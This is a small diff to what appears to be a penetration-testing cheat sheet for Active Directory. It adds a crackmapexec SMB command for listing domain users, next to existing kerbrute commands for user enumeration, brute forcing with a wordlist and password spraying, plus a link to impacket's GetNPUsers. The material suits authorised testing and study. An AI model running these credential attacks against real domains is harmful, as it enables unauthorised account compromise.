@@ -116,6 +116,8 @@ kerbrute userenum -d <domain> --dc <domain controller> ~/Documents/userlist.txt 
 ./kerbrute_linux_amd64 -t <threads> --dc <domain controller> -d <domain> bruteuser ~/Documents/rockyou.txt <username>
 # passwordspray
 ./kerbrute_linux_amd64 -t <threads> --dc <domain controller> -d <domain> passwordspray <userlist> '<password>'
+# crackmapexec needs valid credential
+crackmapexec smb <target ip> -u <username> -p <password> --users
 ```
 
 [GetNPUsers](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py)
